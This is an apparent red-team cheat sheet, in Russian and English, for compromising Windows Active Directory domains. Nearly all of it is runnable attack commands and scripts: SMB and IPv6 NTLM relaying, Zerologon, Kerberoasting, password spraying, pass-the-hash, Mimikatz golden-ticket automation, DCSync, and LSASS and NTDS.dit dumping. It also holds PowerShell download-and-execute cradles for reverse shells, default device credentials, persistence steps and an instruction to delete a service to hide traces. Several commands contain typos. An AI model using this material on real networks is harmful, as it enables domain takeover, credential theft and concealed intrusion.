## БЕЗ ПРИВИЛЕГИЙ

1) Сканнирование SPN.
SPN (Service Principal Name) - имя учетной записи служб запущенных на доменном контроллере.
Формат записи SPN: "serviceclass"/"hostname[:port]"[/"servicename"], serviceclass - идентифицирует класс службы, например ldap. 
                                                                     servicename - FDQN службы или уникальное имя.
Перечень SPN: https://adsecurity.org/?page_id=183
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## СБОР ДАННЫХ

## PORT SCAN:
PowerShell: 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null
PowerShell (host range, specific port): 1..20 | % {$a=$_; write-host "--------"; write-host "10.10.10.$a"; 53,80,445,3389 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.$a",$_)) "Port $_ is open!"} 2>$null}

ОБЩИЕ РЕСУРСЫ:
1) net share -> список общих ресурсов на локальном хосте
2) net view -> список сетевых компьютеров
3) net view COMPUTER_NAME /all -> список шар на удаленном компьютере
4) net user <username> /all (/domain) -> выводит список имен пользователей AD.
5) net localgroup <groupname> /domain 

ЕСЛИ КОМАНДЫ net БЛОКИРУЕТ FIREWALL ПРИМЕНЯЕМ WMIC:
1) wmic share get /format:list
2) wmic /node: COMPUTER_NAME share get

## ABUSING LDAP: 
ldapsearch -h 172.31.1.4 -x -s base namingcontexts

PowerUpSQL - инструмент для обнаружения, перечисления и атак MSSQL серверов.

NAS (Network Attached Storege) - сервер для ъранения данных на файловом сервере.
Default credentials:
admin:admin
admin:password
root:nasadmin
nasadmin:nasadmin
admin:no pass

## ПОЛЬЗОВАТЕЛЬСКИЕ ДАННЫЕ ПРИ НАЛИЧИИ ПРИВИЛЕГИЙ
1) Учетные данные пользователей -> BloodHound
  . .\SharpHound.ps1
  Invoke-Bloodhound -SearchForest -CSVFolder C:\Users\Public
  
2) Локальные данные пользователей ->
  post/windows/gather/enum_chrome
  post/multi/gather/firefox_creds
  post/firefox/gatger/cookie
  post/firefox/gather/passwords
  post/windows/gather/forensics/browser_history

Файлы профилей firefox -> C:\Users\TAGRET\AppData\Roaming\Mozilla\Firefox\Profiles
Файлы профилей chrome -> C:\Users\TAGRET\AppData\Local\Google\Chrome\User Data\Default

Данные удаленного доступа -> post/windows/gather/enum_putty_saved_sessions

Пользовательские файлы -> скрипт WMImplant

Учетные записи администраторов домена -> get-adgroup -filter{GroupCategory -eq 'Security' -AND Name -like "admin"}

Поиск групп Active Directory
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## SMB Relay
1) Update responder config: nano -w /etc/responder/Responder.conf, turn off SMB and HTTP.
2) Run responder: responder -I eth0 -rdwv
3) Opennew tab and run ntlmrelayx.py -tf [file with IP] -smb2support
4) Interactive shell: ntlmrelayx.py -tf [file with IP] -smb2support -i Clarify: list shares and use $[share name]
5) Execute file: ntlmrelayx.py -tf [file with IP] -smb2support -e [filename]
6) Execute command: ntlmrelayx.py -tf [file with IP] -smb2support -c "whoami"
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## GAINING SHELL (SMB enabled and we have user credentials)
1) psexec OR metasploit psexec
2) smbexec OR wmiexec OR evil-winrm
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## IPv6 Attacks
1) Install https://github.com/dirkjanm/mitm6.git
2) Run mitm6 -d [domain name]
3) Open new tab and run: ntlmrelayx.py -6 -t ldaps://[DC ip] -wh fakewpad.domain_name.local -l loot
Resource for read: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## PASSBACK ATTACK (Printers and IoT)
https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## ZEROLOGON ATTACK https://www.trendmicro.com/en_us/what-is/zerologon.html
1) dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
2) SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
   Restore: python3 secretsdump.py Administrator@172.31.3.6 -hashes [LM:NT] //GREP plain_password_hex string
            python3 restorepassword.py sync.csl/SYNC@SYNC -target-ip 172.31.3.6 -hexpass [plain_password_hex]
3) DCSync Attack: secretsdump.py -just-dc sync.csl/SYNC\$@172.31.3.6
   DCSync (Covenant): dcsync <domain>\krbtgt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## KERBEROASTING (Credentials)
1) GetUserSPNs.py domain.local/user:password - RECON SPNs
2) GetUserSPNs.py domain.local/user:password -dc-ip [DC IP] -request
3) Windows: setspn -T TestDomain -Q */*
4) Windows: загружаем билеты в память для дальнейних действий.
            - Add-Type -AssemblyName System.IdentityModel
            - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.testdomain.com:1433"
            - Проверяем, что билет загружен в память: klist
            - Invoke-Mimikatz –Command '" kerberos::list"' /export (модуль PowerSploit)
            - Софт для перебора билета tgsrepcrack.py https://github.com/nidem/kerberoast
            - После взлома пароля: net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password1
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## GPP Attack (Compromised user, member of AD) https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## URL FILE ATTACK
1) Payload file:
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
2) Rename file: @payload
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## PrintNightmare (CVE-2021-1675) (POST COMPROMISING ATTACK, PRIVILEGE ESCALATION)
1) cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675
2) calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675
    - Check: rpcdump.py @[dc-ip] | egrep 'MS-RPRN|MS-PAR'
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## ASEPRoast
Get users NTLMv2 hash.
For attack need to know username and flag 'do not require preauth'

1) GetNPUsers.py -userfile [file] -outputfile [output filename] -dc-ip [DC IP] domain/
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## CRACKMAPEXEC, SECRETSDUMP.PY

1) SMB SHARE PASSWORD SPRAYING: crackmapexec smb [IP] -u username -p password -d [domain] --no-bruteforce
2) PASS THE HASH: crackmapexec smb [IP] -u username -H [hash] //--local-auth: local account
                  psexec.py
                  evil-winrm
3) DUMP LOCAL SAM: secretsdump.py [domain]/[username]:[password]@[TARGET IP]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## TOKEN IMPERSONATING WITH INCOGNITO
Delegate token - login or RDP;
Impersonate - attaching a network drive or a domain logon script;

load_incognito //load module;
list_tokens -u
impersonate_token [domain]\\[username]
shell
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## KIWI, MIMIKATZ

Mimikatz PowerShell Script

1) Invoke-Mimikatz -DumpCreds
2) Invoke-Mimikatz -DumpCreds -ComputerName@("comp1","comp2")
3) Pass-the-hash attack: Invoke-Mimikatz -Command "securlsa::pth /user:Administrator /domain:<domain> /hash:<hash> /run:powershell.exe"
......................................................................................................................................
## Mimikatz from memory in DC:

IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.WebClient).DownloadData("https://raw.githubusercontent.com/phra/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1")))
$(Invoke-Mimikatz -Command ’"lsadump::lsa /inject /name:krbtgt"’) *>&1 > output.txt
$tdomain = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’’)[2] ; }
$tdomain = $tdomain + ’.local’
$sid = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’ ’)[4] ; }
$ntlm = Get-Content .\output.txt | findstr NTLM|Select-Object -first 1 | %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
$write = "Invoke-Mimikatz -Command ‘’‘"kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt‘"‘’ "
$(echo $write) *>&1 > temp_mem.ps1
.\temp_mem.ps1
......................................................................................................................................
## DCSync with Kiwi:

load kiwi
dcsync_ntlm krbtgt
golden_ticket_create -d wazuh.local -u Administrator -s S-1-5-21-3307301586-4221688441-1196996515-502 -k ec9183c701e861eda574d85939d635cd -t /tmp/golden.tck
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## GOLDEN/SILVER TICKET
..............................................................................................
$(.\mimikatz.exe privilege::debug "lsadump::lsa /inject /name:krbtgt", exit ) *>&1 > output.txt
$tdomain = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’, ’)[2] ; }
$tdomain = $tdomain + ’.local’
$sid = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’ ’),[4] ; }
$ntlm = Get-Content .\output.txt | findstr NTLM|Select-Object -first, 1 | %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
.\mimikatz.exe privilege::debug "kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt" exit
.................................................................................................................................
## Mimikatz with DCSync:
$(.\x64\mimikatz.exe "lsadump::dcsync /user:krbtgt" exit) *>&1 > output.txt
$tdomain = Get-Content .\output.txt | findstr Salt |Select-Object -first 1| %{ $_.Split(’:’)[1] ; }| %{ $_.Split(’krbtgt’)[0] ;}| %{ $_.Split(’ ’)[1] ; }
$sid = Get-Content .\output.txt | findstr Object | findstr Security| %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
$ntlm = Get-Content .\output.txt | findstr Hash| findstr NTLM| %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
.\x64\mimikatz.exe privilege::debug "kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt" exit
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## POWERSHELL IN-MEMORY DOWNLOAD AND EXECUTE
1) iex(iwr'http://ip/file.ps1')
2) $down=[System.NET.WebRequest]::Create("http://ip/file.ps1"); $read=$down.GetResponse(); IEX([System.IO.StreamReader]($read.GetReasponseStream())).ReadToEnd()
3) $file=New-Object -ComObject Msxms2.XMLHTTP;$file.open('GET','http://ip/file.ps1',$false);$file.send();iex $file.responseText
4) iex(New-Object Net.WebClient).DownloadString('http://ip/reverse.ps1')
5) $ie=Nwe-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://ip/reverse.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Retrieval of NTDS.DIT with ntdsutil
ntdsutil "activate instance ntds" ifm "create full C:\temp\ntdsutil" quit quit
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Storing registry hives with Reg:
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save

1. creddump7\pwdump.py system sam
2. secretsdump.py -system system -sam sam LOCAL

Автоматизированный подход с помощью доступа через remote registry: secretsdump.py admin@target
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Dump of LSASS with ProcDump:
C:\Users\Administrator\Downloads\procdump.exe -accepteula -64 -ma lsass.exe c:\temp\lsass.dmp
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Dump of LSASS with pd:
C:\Users\Administrator\Downloads\pd.exe -p 552 > c:\temp\lsass.dump
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Dump of LSASS with Minidump:
Import-Module c:\users\administrator\downloads\PowerSploit-master\Exfiltration\Out-Minidump.ps1
Get-Process lsass | Out-Minidump -DumpFilePath c:\temp
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Retrieval of NTDS.DIT with NinjaCopy:
Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\temp\ntds.dit"
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Or to copy the NTDS.DIT of the DC in this laboratory to a no-DC computer:
Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\temp\ntds.dit" -ComputerName "WIN-25U0PFAB511"
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

PowerShell-Remoting 

Enter-PSSession -ComputerName <computername> -Credentials <domain>\username
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <computername> -Credentials <domain>\username

$session = New-PSSession -ComputerName <computer name> -verbose
Enter-PSSession -Session $session -Verbose
Invoke-Command -Session $session -ScriptBlock {whoami;hostname} -Verbose
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Unconstrained delegation

Import powerview;

1) get-netcomputer -unconstrained -properties dnshostname
   ms-rprn.exe \\DC \\Workstation
   rubeus.exe dump /service:krbtgt //looking for DC ticket; 
   Copy DC Base64 encoded krbtgt;
   Make fake token (Covenant): maketoken administrator <username> <junk password>
   rubeus.exe ptt /ticket:<Base64 encoded ticket>
   Get Domain Admin Rights.
   
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Persistence

Add new user: net user <username> <password> /add /domain; net group "<Group name>" <username> /add /domain
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## REMOTE CODE EXECUTION TOOLS:
MSRPC: использует 445 порт.
1. psexec (Sysinternals); //psexec.exe -u admin \\target cmd
2. wmic;
3. psexec.py (impacket); //psexec.py -file somefile.txt admin@target (somefile.txt содержит код для выполнения)
4. winexe; //winexe -U admin //target cmd
5. smbexec.py (impacket); //smbexec.py -mode SHARE admin@target (В результате будет открыт доступ к интерактивной командной строке.)
6. services.py (impacket):
    services.py admin@target list - посмотреть список служб.
    services.py admin@target create -name 1 -display 1 -path 'cmd arg1 arg2' - Создать новую службу, указав произвольную команду.
    services.py admin@target start -name 1 - Запустить только что созданную службу.
    services.py admin@target delete -name 1 - Замести следы и удалить ее.
7. atexec.py/at.exe (impacket/windows internal service);
8. reg.exe; //Удаленный доступ к реестру с правами на запись на самом деле нам дает RCE.

DCERPC (Использует порты 135/TCP и 4915x/TCP, где 4915x — динамически назначаемые порты. Иногда могут использоваться порты из другого диапазона.)
1. wmiexec.py; //wmiexec.py admin@target; //wmiexec.py -nooutput admin@target "mkdir c:\pwn".
2. dcomexec.py; //dcomexec.py admin@target; //dcomexec.py -nooutput admin@10.0.0.64 "mkdir c:\123".
3. wmis; //wmis -U admin //target "mkdir c:\pwn"/
4. wmic.exe; //wmic.exe /user:username /password:s3cr3t /node:target process call create '"c:\123".
5. sc.exe; //Назначение инструмента — удаленное управление службами и драйверами. 
    sc.exe \\target create testservice binPath= \path\to\prog start= auto
    sc.exe \\target start testservice

WinRM
1. Evil-WinRM
2. WinRS.exe/PowerShell; //winrs.exe -u admin -r:target cmd.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## DCShadow










